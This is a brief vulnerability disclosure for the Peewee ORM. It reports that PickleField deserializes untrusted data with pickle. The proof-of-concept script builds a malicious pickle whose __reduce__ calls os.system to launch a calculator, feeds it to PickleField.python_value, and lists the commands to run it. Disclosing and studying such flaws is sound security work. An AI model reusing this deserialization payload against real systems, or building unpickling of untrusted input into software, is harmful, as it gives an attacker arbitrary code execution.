# Description
Peewee is a simple and small ORM. It has few (but expressive) concepts, making it easy to learn and intuitive to use.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install peewee')
from playhouse import fields
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
fields.PickleField.python_value(dumps,dumps)
```
* `pip3 install peewee`
* `python3 exploit.py`
